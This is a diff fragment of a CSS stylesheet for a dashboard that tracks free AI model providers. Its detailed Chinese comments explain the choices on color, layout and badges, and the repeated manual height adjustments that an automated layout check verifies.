+     几乎全是推荐**（实测 gemini 4/6、mistral 3/6、openrouter 6/6），于是一屏十来个黄星，
+     标记不再提供区分信息，只剩"页面很花"。⭐ 去掉后，这一屏的彩色只剩 ⏳ 限时 ——
+     稀缺语义才配用颜色（Vercel 的模型表 18 行里只有 3 个绿标，同一个道理）。
+     信息没丢：title 里仍写着"推荐 / 长期免费"，展开后字重的台阶就是推荐边界。
+     注意 .chip.rec 此前**从未被 JS 用过**（是死类），这轮才真正生效。 */
+  .chip.rec{font-weight:500;color:var(--ink)}
+  .chip.promo{color:var(--accent);font-weight:500;background:var(--accent-bg)}
+  .chip.blk{color:var(--err);text-decoration:line-through;text-decoration-thickness:1px}
+  .chip.qtn{color:var(--warn);text-decoration:line-through;text-decoration-thickness:1px}
+  /* 「+N」是**全卡唯一的动作**，所以它是唯一带边框的标签 —— 其余标签全是无边浅灰底，
+     一屏里只有一个"描边按钮"，可点性一眼可见（不用额外写"点一下"）。
+     形状和其他标签一致（6px 圆角），不再用 980px 胶囊 —— 第五轮之前它是一屏里唯一的长圆形，
+     那个形状差异只带来"不齐"的观感。padding 减 1px 抵消边框，纵向高度与其他标签一致。 */
+  .chip.more{background:#fff;border:1px solid var(--accent-border);color:var(--accent);cursor:pointer;font-weight:600;padding:1px 8px;border-radius:6px}
+  .chip.more:hover{background:var(--accent-bg)}
+  /* 「白名单里还没接入」的 chip 可点（2026-09-25）：点一下把接入信息填进右侧添加表单。
+     它和候选行走同一条路径，但语义不同 —— 这些是白名单**已确认**有免费模型的厂商。 */
+  .chip.avail{cursor:pointer;transition:background .12s,color .12s}
+  .chip.avail:hover{background:#e3ecf7;color:var(--accent)}
+  /* 「免 Key 实测可调用」标记（2026-09-30）：巡检用无 Key 请求真调通过的厂商。
+     它是唯一"实测过、且没有账号所以没有扣费通道"的一档 —— 用户看到就知道这家
+     连 Key 都不用申请。绿色只给这一个词，不做整块着色（"标记上到几乎每一项就不再是信号"）。 */
+  .chip .anonmark{margin-left:5px;font-size:var(--fs-1);padding:0 4px;border-radius:4px;background:var(--ok-bg);color:var(--ok);font-weight:600}
+  /* 配置快照行（2026-10-17）：和目录表行同一套语言 —— 左名字、中说明、右动作。 */
+  .srow{display:flex;align-items:center;gap:10px;padding:9px 0;border-top:1px solid var(--line-soft)}
+  .srow:first-child{border-top:none}
+  .srow .snm{flex:0 1 auto;min-width:0;font-size:var(--fs-3);color:var(--ink);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .srow .smeta{flex:1 1 auto;min-width:0;font-size:var(--fs-2);color:var(--faint);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .empty{font-size:var(--fs-2);color:var(--faint);padding:6px 0}
+  /* 目录里每家的「排除 N 个」：2026-09-25 从 chips 行末尾的内联小标改成收进 hd 行
+     （原来 7 家就重复 7 遍同样的句子），并且可以直接点开看明细。 */
+  /* 「排除 N 个」是次要信息，常态用淡灰，hover 才变蓝 —— 7 行都挂蓝色链接会抢走
+     厂商名和模型数的注意力（2026-09-25）。 */
+  /* "排除 N" 是背景信息，"几个可用"才是用户扫这一行要看的 —— 用颜色把主次拉开 */
+  .catprov .hd .cnt.exlink{margin-left:5px;color:var(--faint);cursor:pointer;text-decoration:none;font-size:var(--fs-1)}
+  .catprov .hd .cnt.exlink:hover{color:var(--accent);text-decoration:underline}
+  /* ── 目录表行（2026-10-17）────────────────────────────────
+     参考对象换成 Magpie 的模型选择器：**一行一个模型**，左边名字、右边状态。
+     第五轮定的"一个白面 + 发丝行线、层级靠颜色对比"没变，只是把 chips 的
+     "标签墙"换成"表行" —— 标签墙的问题不在丑，在**读不出主次**：一屏 30 个
+     等大的灰标签，眼睛只能逐个数；表行有固定的左起点，模型名一列就能竖着扫。
+     上色规则沿用"只给稀缺语义"：限时 / 已失效上色，**长期免费不标** ——
+     90% 的行都标"免费"等于没标。 */
+  .catprov .mrows{display:flex;flex-direction:column;margin:0 -6px}
+  /* 行高 32px（2026-10-17 显式化）：原来是 26px，但弹层里另一个同名 .mrow 规则
+     （margin-top:10px）在后面定义、把它撑成了 36px —— 也就是说这个 26px **从来没生效过**。
+     改名之后真实行高露出来了，这里按"一行 14px 文字上下各留 9px"定成 32px：
+     比 26px 透气，又不至于像 46px 的客户端列表那样一行只放一个名字。 */
+  .mrow{display:flex;align-items:center;gap:10px;height:32px;padding:0 6px 0 22px;border-radius:7px;min-width:0}
+  .mrow:hover{background:var(--field)}
+  .mrow .mnm{flex:1 1 auto;min-width:0;font-size:var(--fs-3);color:var(--ink);letter-spacing:-.01em;
+    white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .mrow .mst{flex:0 0 auto;font-size:var(--fs-1);color:var(--faint);white-space:nowrap}
+  /* 「推荐」只靠字重（和第五轮 .chip.rec 同一套口径），不额外加字 */
+  .mrow.rec .mnm{font-weight:500}
+  .mrow.promo .mst{color:var(--accent);font-weight:500}
+  .mrow.dead .mnm{color:var(--sub);text-decoration:line-through;text-decoration-thickness:1px}
+  .mrow.dead .mst{color:var(--err)}
+  /* 「还有 N 个」是这一组唯一的动作 —— 整行可点，不用描边按钮（表行里放按钮会破列对齐）。
+     ⚠ 2026-10-17 去蓝：它每组都出现（一屏 5~9 个），一列蓝色链接会把"强调色"用成背景色 ——
+     和「长期免费不标」同一条道理。常态用 --sub，hover 时才给强调色。 */
+  .mrow.more{color:var(--sub);font-size:var(--fs-2);font-weight:500;cursor:pointer}
+  .mrow.more:hover{background:var(--accent-bg);color:var(--accent)}
+  .exclude-body{margin-top:7px;padding:8px 10px;border-radius:var(--r-sm);background:#f8fafc;border:1px solid var(--line-soft);display:flex;gap:5px;flex-wrap:wrap;align-items:center}
+  .exclude-chip{font-size:var(--fs-2);padding:2px 8px;border-radius:6px;border:1px solid var(--line-soft);color:#5b6b80;background:#fff;font-variant-numeric:tabular-nums}
+  .exclude-chip em{font-family:inherit;font-style:normal;color:var(--faint)}
+  /* 「发现更多免费厂商」里的小节标签（2026-09-25）：替代原来两段长说明文字 ——
+     卡头标题已经说了这是什么，正文再复述一遍只是噪音。 */
+  .sect{display:flex;align-items:baseline;gap:7px;flex-wrap:wrap;margin-bottom:7px}
+  .sect-t{font-size:var(--fs-2);font-weight:600;color:var(--text)}
+  .sect-n{font-size:var(--fs-2);color:var(--faint)}
+  #availbox + #candbox{margin-top:16px}
+
+  /* ── 变动记录 / 使用记录 ───────────── */
+  /* 单行优先, 放不下允许最多两行: 取消 nowrap, 中间那段用 line-clamp:2 兜底,
+     完整内容挂 title, 用户要"看个大概, 不被截断"。以前的 nowrap+ellipsis 在长备注时
+     一行只露一个省略号, 信息密度太低 —— 用户原话"内容太多没办法单行显示的可以双行"。 */
+  .chg-list{max-height:320px;overflow:auto}
+  /* 使用记录固定一屏可扫的高度（2026-09-25 回退）：试过放到 840 让 30 条全展开，
+     结果左列被这条流水账撑得又长又空，用户反馈"不用那么高"。回到 340 ——
+     它本来就是"扫一眼最近有没有异常"的面板，要翻记录去 usage_log.json。 */
+  #usagelist{max-height:340px}
+  /* 模型分布汇总（2026-10-06）：刻意放在 #usagelist **外面** —— 在里面会跟着流水一起滚走，
+     而它要回答的正是"这一屏流水里到底是谁在干活"，必须常驻。空态用 :empty 自动收起，不占高度。 */
+  .usgagg{display:flex;flex-wrap:wrap;gap:5px 16px;margin:1px 0 9px;font-size:var(--fs-2);color:var(--sub)}
+  .usgagg:empty{display:none}
+  .usgagg .ua{display:inline-flex;align-items:baseline;gap:6px;min-width:0;max-width:100%}
+  .usgagg .ua .nm{color:var(--text);font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:220px}
+  .usgagg .ua .n{color:var(--sub);font-variant-numeric:tabular-nums}
+  .usgagg .ua .bad{color:var(--err)}
+  /* 「免费池变动」312px（2026-09-26 第三轮）：目录结构改成"标题行 + 条目行"后，**目录卡在
+     1200px 与 1440px 下等高**了（条目行拿回全宽，换行数不再随视口变），右列两个视口的总高差
+     就只剩这一项 —— 所以不再需要按视口分档补偿（上一版的 @media 已删）。
+     条数不变（仍是最新 50 条），内容有 1500px+ 远超容器，加高不丢信息，反而多看到几条。
+     335 → 383（2026-09-26 第六轮）：同因失败合并 + 空态挂右侧后，目录卡的**空态家各少占一行**
+     （实测 2 家共省约 40px）→ 右列变矮，1440px 两列差冲到 87px 越线。这一项照旧是补偿位。 */
+  /* 「免费池变动」的高度（2026-09-26 第八轮重定）：它同时是**两列等高的补偿位**。
+     问题：`body{max-width:1380px}` → 视口越宽右列越宽 → 目录 chips 少换行 → 右列越矮
+     （实测目录卡 1200px 546px → 1440px 494px，差 52px；左列 5 张卡两视口高度完全一致）。
+     383 → 423（+40）：1200px 的两列差 34 → 6px、1440px 85 → 45px，中段视口（内容宽度渐变）
+     落在两者之间，全程不越 60px 红线。
+     ⚠ **试过"治本"，CSS 做不到**：`.grid{align-items:stretch}` + `#chgcard{flex:1}` +
+     `#changes{flex:1;max-height:none}` 会让列表把 50 条全铺开 —— 列高本身由内容决定，
+     没有"多余空间"可分，flex-grow 拿不到东西，页高从 1496 冲到 2661。
+     改用 stretch 让"容器等高"更不行：那是拿容器高度骗断言，内容仍矮一截（= 假断言）。
+     → 保留手工补偿；漂移由 layout-check 的 1200 / 1440 两条断言守着（会红，不会静默失效）。
+     内容有 1500px+ 远超容器，加高不丢信息，反而多看到几条。
+     ⚠ 423 → 548（2026-10-04）：接入 OVH / Kilo 两家免 Key 厂商后左列供应商卡多 2 行，
+     实测两列差 1200px 132px / 1440px 183px，**双双越线**。这个补偿位正是为此存在的 ——
+     沿"差多少补多少"直接调，落到 33px / 18px，两条断言重新全绿。
+     ⚠ 548 → 503（2026-10-04 晚，降噪改版后）：巡检告警从"每家一个三行橙块"合并成"同因一行"，
+     但告警**有/无**本身就让右列高度摆动（空态 0px ↔ 有告警 38px）—— 这轮实测右列反比左列高
+     71px（1200px）/ 20px（1440px）。按同一套算法反推：1200px 要减 ≥11px、1440px 要减 ≤80px，
+     取中 45px → 548-45=503，两视口落到 26px / 25px，双双留足余量。
+     注意：**越线不是肉眼发现的，是 layout-check 报出来的** —— 手工平衡的指标必然漂移，
+     这正是那条断言的价值所在。
+     ⚠ 503 → 588（2026-10-06）：「模型使用记录」卡头新增"模型分布汇总"一行后左列长 89px，
+     实测两列差 1200px 100px / 1440px 130px，**双双越线**。沿同一套算法加 85px，
+     两视口落到 15px / 45px。又一次验证：越线由断言报出，不靠肉眼。 */
+  /* ⚠ 588 → 267（2026-10-17）：「免费模型目录」从 chips 墙改成**一行一个模型**的表行，
+     右列长高 286px，实测两列差 361px（1200 / 1440 都是），越线 6 倍。沿同一套算法减 321px
+     （361-40 留余量），两视口落到 40px 上下。
+     这又一次说明它是**平衡量不是常量**：卡片内容一改，这个数字必须重算，别抄。
+     ⚠ 267 → 204 → 244（2026-10-17 同日三次）：① 说明行去掉胶囊后 hero 矮 2px；
+     ② 修掉 `.mrow` 类名撞车（弹层那条规则把目录表行撑成 36px）后，右列一次少了 170px；
+     ③ 表行显式定成 32px 又长回 102px。最终 244 → 两视口 47 / 29px。
+     目录行数是动态的 —— 这个数字会一直漂，别当常量抄，每次改完跑一次 layout-check。 */
+  #changes{max-height:244px}
+  .chg{display:flex;gap:9px;align-items:flex-start;font-size:var(--fs-2);padding:5px 0;border-bottom:1px solid var(--line-soft)}
+  .chg:last-child{border-bottom:none}
+  .chg>span{min-width:0;flex:0 0 auto}
+  .chg .tm{color:var(--faint);font-size:var(--fs-1);font-variant-numeric:tabular-nums;min-width:78px}
+  .chg .tag{font-size:var(--fs-1);font-weight:500;padding:1px 7px;border-radius:980px;background:var(--field);color:var(--sub)}
+  .chg .tag.added,.chg .tag.release,.chg .tag.unblock,.chg .tag.use_ok{color:var(--ok)}
+  .chg .tag.removed,.chg .tag.blocked,.chg .tag.use_fail{color:var(--err)}
+  .chg .tag.promo_start{color:var(--accent)}
+  /* pool_sync 是「过程留痕」（每轮同步必产生一条），不是需要行动的事件 —— 用中性灰而非 accent 蓝
+     （2026-10-04 实测）：50 条里它占约 1/5，且与「免费变多」**同秒成对出现**（同一件事的两种表述），
+     蓝色让它比真正的结果事件还抢眼，主次读反了。彩色只留给稀缺语义（新增/移除/隔离/限时）。 */
+  .chg .tag.pool_sync{color:var(--faint)}
+  .chg .tag.promo_end,.chg .tag.quarantine,.chg .tag.promo,.chg .tag.probe_block,.chg .tag.sweep_block{color:var(--warn)}
+  /* 免费模型数量的规模突变: 变多可能是上新活动(好消息/绿), 变少要警惕是不是砍了免费档(橙) */
+  .chg .tag.pool_up{color:var(--ok)} .chg .tag.pool_down{color:var(--warn)}
+  /* 中间那段(厂商 + 模型 + 说明)独占剩余宽度, 最多两行: 用户要求"尽量单行,
+     实在放不下双行"。 -webkit-box + line-clamp 是唯一能在 flex 子元素里稳妥截断的写法
+     (直接 line-height+max-height 在中英文混排时算不准行数, 经常多截一行)。 */
+  .chg .bd{flex:1 1 auto;min-width:0;overflow:hidden;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:2;line-height:1.5;padding-top:1px}
+  /* 模型名**不用等宽**（2026-09-26，09-25 就发现但一直没做的那条）：等宽只留给
+     id / 代码 / 请求号这类**标识符**，模型名是**内容** —— 而它在「免费模型目录」里
+     本来就是系统字体，同一屏两套字体看着就不统一。 */
+  .chg .mdl{font-family:inherit}
+  .chg .nt{color:var(--sub);font-size:var(--fs-2)}
+  .chg .reason{color:var(--sub);font-size:var(--fs-2);margin-left:6px}
+
+  /* ── 添加供应商模型选择 ───────────── */
+  .pickbox{margin-top:10px;border:1px solid var(--line);border-radius:var(--r-md);padding:10px 12px;max-height:250px;overflow:auto;background:var(--card2)}
+  .pickbox .hd{font-size:var(--fs-2);color:var(--sub);margin-bottom:7px;display:flex;align-items:center;gap:7px;flex-wrap:wrap}
+  .pickbox .hd a{color:var(--accent);text-decoration:none;cursor:pointer;font-weight:500}
+  .pickbox .hd a:hover{text-decoration:underline}
+  .mitem{display:flex;align-items:center;gap:8px;font-size:var(--fs-2);padding:5px 7px;border-radius:7px;cursor:pointer}
+  .mitem:hover{background:var(--card)}
+  .mitem input{width:auto;accent-color:var(--accent)}
+  .mitem .id{font-family:ui-monospace,Consolas,monospace;font-size:var(--fs-2)}
+
+  /* ── 厂商选择器(替代原生 select: 原生 option 塞不下状态徽标, 且一长串很难看) ── */
+  .vpicker{position:relative}
+  .vbtn{
+    width:100%;display:flex;align-items:center;gap:8px;text-align:left;
+    background:var(--card);border:1px solid var(--line);border-radius:var(--r-sm);padding:8px 11px;
+    font-size:var(--fs-2);color:var(--text);cursor:pointer;font-weight:400
+  }
+  .vbtn:hover{background:var(--card);border-color:var(--accent)}
+  .vbtn .caret{margin-left:auto;color:var(--faint);font-size:var(--fs-1)}
+  /* 弹层比按钮宽（按钮只有半栏 ~250px），右对齐向左展开。
+     加宽到 540px 是为了让 名字 + 备注 + 域名 + 徽标 一行排得下 —— 440px 时长域名把备注挤没了 */
+  .vpop{
+    position:absolute;z-index:60;top:calc(100% + 4px);right:0;left:auto;width:min(540px,92vw);
+    /* 限高 340 -> min(440px,62vh)（2026-09-25）：名单现在跟着白名单每天长（24 家），
+       340px 只能看到 7 行，新加进来的都沉在底部要滚动才看得见 —— 用户会以为"列表没变过"。 */
+    max-height:min(440px,62vh);overflow:auto;
+    background:var(--card);border:1px solid var(--line);border-radius:var(--r-md);box-shadow:0 8px 28px rgba(0,0,0,.10);padding:6px
+  }
+  .vpop .grp{font-size:var(--fs-1);font-weight:600;letter-spacing:.04em;color:var(--faint);padding:7px 8px 4px;text-transform:uppercase}
+  /* 单行布局：[厂家名] [备注] … [域名] [状态徽标] —— 备注是用户熟悉的 VENDOR_DIR 说明 */
+  .vopt{display:flex;align-items:center;gap:8px;padding:6px 8px;border-radius:7px;cursor:pointer;font-size:var(--fs-2);min-width:0}
+  .vopt:hover{background:var(--accent-bg)}
+  .vopt .vn{font-weight:600;letter-spacing:-.012em;flex:0 0 auto;white-space:nowrap;font-size:var(--fs-2)}
+  /* 备注：名字后面的灰色小字，单行截断。flex:1 占名字和域名之间的所有剩余空间 */
+  .vopt .vnote{flex:1 1 auto;min-width:80px;font-size:var(--fs-2);color:var(--sub);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  /* 域名限宽 170px 截断 —— 不能让它把备注挤没了 */
+  .vopt .vh{flex:0 0 auto;max-width:170px;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:ui-monospace,Consolas,monospace;font-size:var(--fs-1);color:var(--faint);text-align:right}
+  .vopt .vs{font-size:var(--fs-1);font-weight:600;padding:1px 7px;border-radius:980px;background:var(--field);color:var(--sub);flex:0 0 auto}
+  .vopt .vs.free{color:var(--ok)} .vopt .vs.promo{color:var(--accent)} .vopt .vs.paid{color:var(--faint)}
+  /* 「待实测」= 厂商发现源(models.dev)刚捞到、只知标价 0、我们没真调过。
+     用 warn 橙是"提请注意"不是"出事了" —— 这类厂商可能压根不可信(实测有标 52 个含 claude-sonnet-4-6 的)。 */
+  .vopt .vs.prov{background:var(--warn-bg);color:var(--warn)}
+  /* 「Key 当前不可用」= 已接入, 但账号级看不到任何模型(见服务端 accountIssue)。
+     必须和「限时免费」并排显示: 厂商宣传免费 ≠ 你的 Key 能用, 这两句话本来就都成立,
+     分开标注才不会读成自相矛盾(2026-09-21 商汤那次: 一行写"限时免费中", 卡片写"0/1 正常")。 */
+  .vopt .vs.keybad{background:var(--warn-bg);color:var(--warn)}
+  /* 候选厂商行(白名单发现源捞到、未收录): 弱化处理, 与正式名单视觉分层, 避免喧宾夺主。
+     ⚠ 这个类名有**测试依赖**: 控制台冒烟脚本用"行内没有 .vs.cand"来判断"该行有中文名"。
+     所以巡检徽标一律不许复用它 —— 否则一个"有中文名 + 接入点待确认"的行会被误判成无名,
+     测试报出假回归。巡检徽标见下面 p_* 那一组。 */
+  .vopt .vs.cand{background:var(--field);color:var(--faint)}
+  /* ── 无 Key 巡检徽标 (patrolWhitelist 候选侧, 每天一次) ────────────────────
+     独立一套 p_* 类名, 刻意不复用 .free/.cand/.keybad —— 那些类名在别处(以及回归测试里)
+     已经有固定语义, 借用会把两件事搅在一起。 */
+  /* 「实测可列」= 无 Key 直接探到 /models 能匿名列出模型, 候选里证据最强的一档 */
+  .vopt .vs.p_listed{background:var(--ok-bg);color:var(--ok)}
+  /* 候选行的「免费 N」用中性灰而不是绿：它紧挨着「能匿名列模型」那个绿徽标，两个绿并排会互相削弱；
+     而且这个数只是**数据源的说法**（未实测），绿色（=已证实）属于过度承诺。 */
+  .vopt .vs.nfree{background:var(--field);color:var(--sub)}
+  /* 「源数据查无」= 端点确实能匿名列出模型，但该数据源声明的免费模型在端点列表里一个都找不到。
+     从绿降级为橙：能列模型是真的，但这批源数据的可信度已被证伪 —— 不降级就是谎报。 */
+  .vopt .vs.p_stale{background:var(--warn-bg);color:var(--warn)}
+  /* 「实测需 Key」= 探到 401/403, 端点确实活着。用蓝(accent)而不是绿:
+     它证明的是"厂商真实存在", 不证明"免费" —— 免费与否仍只是数据源的说法。 */
+  .vopt .vs.p_needs_key{background:var(--accent-bg);color:var(--accent)}
+  /* 「接入点待确认」= 常见路径都没模型列表。不代表厂商死了, 多半是接入点路径不同 */
+  .vopt .vs.p_no_list{background:var(--field);color:var(--sub)}
+  /* 「端点存在」= 405/400/5xx: 路径在, 但这个网关**不提供「列出模型」接口**
+     (实测 iFlow 的 /v1/chat/completions 返 405、亚马逊 Nova 的 /v1/chat/completions 返 500)。
+     和「实测需 Key」分开是因为证据不同: 405 只证明**路径存在**, 不证明要 Key —— 不能谎报状态。
+     用 field 底 + 深蓝字: 比「待确认」(浅灰字)明确, 比「需 Key」(蓝底蓝字)弱一档。
+     ⚠ 注释里**别写域名**(如 xxx 点 com) —— deadcode-scan 会把 `.com` / `.cjs` 当成类选择器报孤儿类。 */
+  .vopt .vs.p_exists{background:var(--field);color:var(--ink-2)}
+  /* 「实测连不通」= DNS/超时。名单上的「免费」很可能是空头支票 */
+  .vopt .vs.p_unreachable{background:var(--warn-bg);color:var(--warn)}
+  /* 「无法探测」= 接入点含 {占位符}, 连地址都不完整 */
+  .vopt .vs.p_skip{background:var(--field);color:var(--faint)}
+  /* ⚠ 候选区复用 .vopt 的行样式, 但 .vn 是 `flex:0 0 auto + nowrap` —— 正式名单的厂商名很短
+     (Groq/Cohere)所以没事, 候选区的名字却可能很长("阿里云百炼 Token Plan（新加坡）")。
+     实测后果(2026-09-21): 一个长名字让 #candbox 的 min-content 宽到 652px, 把移动端的
+     **布局视口**整个撑大(innerWidth 390→652), 页面在手机上直接横向错位。
+     ⚠ 候选行的信息优先级(2026-09-21 二次修正): **厂商名 > 徽标 > 域名**。
+     上一轮只给 .vn 加了 min-width:0 来压宽度, 但没定优先级 —— 结果"挤不下时"被牺牲的**永远是名字**:
+     实测 47 行里 38 行的名字只剩 "Um…"/"O…"/"Em…", 根本认不出是哪家, 而最不重要的模型样例反而完整可读。
+     加无 Key 巡检徽标后缺口更大, 必须把优先级明确下来。
+     ⚠ 而且"让备注去挤"也不行: 挤到几个像素时它会显示成单字碎片("g"/"in"/"mo"), 比不显示更像坏了
+     (实测截图确认)。所以**模型样例直接从候选行里拿掉**, 只在 hover 弹层里给(弹层首行就是完整厂商名,
+     名字被省略号截断时靠它兜底)。这样候选行是干净的单行 30px —— 不换行很重要:
+     无条件 flex-wrap 会让 47 行全变 54/78px 的两三行, 用户明确反感过"显得好乱"。
+     实测: 名字被截 38→7(剩"阿里云百炼 Coding Plan（…）"这种真长的), 行溢出 0, 单行 30px。 */
+  #candbox .vopt .vn{min-width:0;max-width:340px;flex-shrink:1;overflow:hidden;text-overflow:ellipsis}
+  #candbox .vopt .vh{flex:0 1 auto;min-width:0;flex-shrink:3}
+  /* 2026-09-19 取消过 4 个实测徽标(已接入 / 端点实测 / 需Key / 路径未探到 / 端点不通) —— 用户原话"显得好乱"。
+     p.patrol 字段保留(诊断仍要用), 只是不再渲染到 vopt 行内。 */
+  .vsearch{width:100%;margin-bottom:4px}
+
+  /* ── Toast ───────────────────────── */
+  #toasts{position:fixed;right:20px;bottom:20px;display:flex;flex-direction:column;gap:8px;z-index:99}
+  .toast{
+    background:var(--card);border:1px solid var(--line);border-radius:12px;padding:10px 14px;font-size:var(--fs-2);
+    box-shadow:0 6px 24px rgba(0,0,0,.10);max-width:340px;animation:tin .22s cubic-bezier(.22,.61,.36,1)
+  }
+  .toast b{display:block;margin-bottom:2px;font-size:var(--fs-2);font-weight:600}
+  .toast.err b{color:var(--err)} .toast.ok b{color:var(--ok)} .toast.warn b{color:var(--warn)}
+  .toast .d{color:var(--sub);font-size:var(--fs-2);word-break:break-all;max-height:100px;overflow:auto}
+  @keyframes tin{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+  .spin{display:inline-block;width:11px;height:11px;border:2px solid var(--line);border-top-color:var(--accent);border-radius:50%;animation:sp .7s linear infinite;vertical-align:-1px}
+  @keyframes sp{to{transform:rotate(360deg)}}
+
+  footer{text-align:center;font-size:var(--fs-1);color:var(--faint);padding:20px 0 0}
+
+  /* ── 顶栏视图切换 ─────────────────── */
+  .tabs{margin-left:auto;display:flex;gap:2px;background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.16);border-radius:10px;padding:2px;position:relative;z-index:1}
+  .tab{border:0;background:transparent;color:rgba(255,255,255,.72);font:inherit;font-size:var(--fs-2);font-weight:500;padding:5px 13px;border-radius:8px;cursor:pointer;transition:background .15s,color .15s}
+  .tab:hover{color:#fff;background:rgba(255,255,255,.12)}
+  .tab.on{background:#fff;color:var(--ink)}
+  .tab.on:hover{background:#fff}
+
+  /* ── 调试台 ───────────────────────── */
+  /* 工具栏: 模型 + 三个动作放一条带底色的条里, 上下加 padding, 不再像表单挤在一起 */
+  .pgbar{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin:4px 0 12px;padding:10px 12px;background:var(--card2);border:1px solid var(--line);border-radius:var(--r-md)}
+  .pgbar-fld{flex:1;min-width:200px}
+  .pgbar-fld select,.pgbar-fld .vbtn{width:100%;margin:0}
+  .pgbar-act{display:flex;gap:6px;flex:0 0 auto;align-items:center}
+  /* 一键填: 几个常见链路探测句, 省得每次都自己敲 */
+  .pgsug{display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-bottom:12px;font-size:var(--fs-2)}
+  .pgsug-lbl{font-weight:600;letter-spacing:.04em;text-transform:uppercase;color:var(--faint);font-size:var(--fs-1);margin-right:2px}
+  .pgsug-chip{padding:4px 11px;border-radius:980px;border:1px solid var(--line);background:var(--card);font:inherit;font-size:var(--fs-2);color:var(--accent);cursor:pointer;transition:background .15s,border-color .15s}
+  .pgsug-chip:hover{background:var(--accent-bg);border-color:var(--accent-border)}
+  /* 指标 pill: 一眼看清这次调用的所有指标, 不用对着 status 字符串逐项解析 */
+  .pgstat-bar{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px}
+  .pgpill{display:inline-flex;align-items:center;gap:6px;padding:5px 10px;border-radius:980px;background:var(--card2);border:1px solid var(--line);font-size:var(--fs-1);color:var(--sub)}
+  .pgpill i{font-style:normal;font-size:var(--fs-1);letter-spacing:.05em;text-transform:uppercase;color:var(--faint);font-weight:600}
+  .pgpill b{font-weight:600;color:var(--ink);font-family:ui-monospace,Consolas,monospace;font-size:var(--fs-1);letter-spacing:-.01em}
+  .pgpill-wide{flex:1;min-width:120px}
+  .pgpill-rid{flex:1;min-width:160px}
+  /* 输出区: 头部带状态行 + 大段正文, 字号比仪表盘稍大, 适合读回答 */
+  .pgout-wrap{border:1px solid var(--line);border-radius:var(--r-md);background:var(--card2);overflow:hidden}
+  .pgout-hd{display:flex;align-items:center;gap:8px;padding:9px 13px;border-bottom:1px solid var(--line-soft);background:var(--card);font-size:var(--fs-2);color:var(--sub)}
+  .pgout-hd .dot{box-shadow:none}
+  .pgout-hd b{font-weight:600;color:var(--ink);font-family:ui-monospace,Consolas,monospace;font-size:var(--fs-2)}
+  .pgout{min-height:260px;max-height:52vh;overflow:auto;padding:16px 18px;white-space:pre-wrap;word-break:break-word;font-size:var(--fs-2);line-height:1.7;color:var(--text)}
+  .pgout .cur{display:inline-block;width:7px;height:14px;background:var(--accent);vertical-align:-2px;animation:bl .9s steps(2) infinite;margin-left:1px}
+  @keyframes bl{50%{opacity:0}}
+  .pgin{margin-top:12px}
+  .pgin textarea{width:100%;padding:11px 13px;border:1px solid var(--line);border-radius:var(--r-md);background:var(--card);font-family:inherit;font-size:var(--fs-2);line-height:1.6;resize:vertical;color:var(--text);transition:border-color .15s,box-shadow .15s}
+  .pgin textarea:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 3px color-mix(in srgb,var(--accent) 18%,transparent)}
+  .pgin-foot{margin-top:6px}
+  .pgtip{font-size:var(--fs-2);color:var(--faint)}
+
+  /* ── 弹层 ─────────────────────────── */
+  .mask{position:fixed;inset:0;background:rgba(14,32,58,.34);z-index:80;display:flex;align-items:flex-start;justify-content:center;padding:56px 16px 24px;overflow:auto}
+  .modal{background:var(--card);border:1px solid var(--line);border-radius:var(--r-lg);box-shadow:0 18px 60px rgba(14,32,58,.20);width:100%;max-width:720px}
+  .mhd{display:flex;align-items:center;gap:10px;padding:14px 18px;border-bottom:1px solid var(--line-soft)}
+  .mhd h3{font-size:var(--fs-3);font-weight:500}
+  .mbd{padding:16px 18px;max-height:64vh;overflow:auto}
+  .mbd .desc{margin-bottom:10px}
+
+  /* ── Key 管理 ─────────────────────── */
+  .krow{display:flex;align-items:center;gap:9px;padding:9px 11px;border:1px solid var(--line);border-radius:var(--r-sm);background:var(--card2);margin-bottom:7px;flex-wrap:wrap}
+  .krow .kid{font-family:ui-monospace,Consolas,monospace;font-size:var(--fs-2);flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .krow .kmeta{font-size:var(--fs-1);color:var(--faint);white-space:nowrap}
+  .krow.off{opacity:.55}
+  .krow .kbadge{font-size:var(--fs-1);padding:1px 7px;border-radius:99px;border:1px solid var(--line);color:var(--sub);white-space:nowrap}
+  .krow .kbadge.cd{color:var(--warn);border-color:var(--warn)}
+  .krow .kbadge.dis{color:var(--err);border-color:var(--err)}
+
+  /* ── 配置片段 ─────────────────────── */
+  .snip-tabs{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:12px}
+  .snip-tab{border:1px solid var(--line);background:var(--card);color:var(--sub);font:inherit;font-size:var(--fs-2);padding:5px 12px;border-radius:8px;cursor:pointer;transition:background .15s,border-color .15s,color .15s}
+  .snip-tab:hover{background:var(--accent-bg);border-color:var(--accent-border);color:var(--ink)}
+  .snip-tab.on{background:var(--accent-bg);border-color:var(--accent);color:var(--accent);font-weight:500}
+  .snip-pre{background:var(--field);border:1px solid var(--line);border-radius:var(--r-sm);padding:11px 13px;font-family:ui-monospace,Consolas,monospace;font-size:var(--fs-2);line-height:1.65;white-space:pre-wrap;word-break:break-all;margin-bottom:10px}
+  .snip-note{font-size:var(--fs-2);color:var(--sub);margin-bottom:9px}
+
+  /* ── 记录行里的附属信息 ───────────── */
+  /* 右侧的请求 ID 与耗时列固定宽度 + 右对齐: 几十行扫下来右边缘才是齐的, 否则每行错开一点很毛躁 */
+  .chg .rid{font-family:ui-monospace,Consolas,monospace;font-size:var(--fs-1);color:var(--accent);cursor:pointer;min-width:62px;text-align:right}
+  .chg .rid:hover{text-decoration:underline}
+  .chg .kpi{font-family:ui-monospace,Consolas,monospace;font-size:var(--fs-1);color:var(--faint);white-space:nowrap;min-width:70px;text-align:right}
+  /* 请求 ID 的可复制样式在调试台也要用, 所以不限定在 .chg 里 */
